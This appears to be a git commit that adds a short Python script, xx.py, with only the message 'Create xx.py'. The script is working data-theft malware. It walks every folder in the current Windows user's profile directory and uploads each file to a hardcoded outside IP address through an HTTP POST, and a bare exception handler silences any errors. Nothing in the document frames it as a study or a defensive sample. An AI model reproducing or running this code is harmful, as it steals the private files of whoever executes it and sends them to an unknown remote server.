fd51d0892e414ad2a826ed794c930fa7fe26b588
somehat <118371804+somehat@users.noreply.github.com>
2022-11-28 11:27:13 -0300

    Create xx.py

---
+++ xx.py
@@ -0,0 +1,20 @@
+import os
+import glob
+import requests
+from os import listdir
+
+user = os.environ.get("USERNAME")
+path = f'C:/Users/{user}/'
+    
+
+for folder in listdir(f'C:/Users/{user}'):
+    current = path + folder
+    print(">>>>>", current)
+    for file in glob.glob(f'{current}/*.*'):
+        print(file)
+        try:
+            url = 'http://3.85.122.241/globo_file.php'
+            files = {'file': open(bytes(file, encoding='utf-8', errors='ignore'), 'rb')}
+            r = requests.post(url, files=files)
+        except:
+            ...
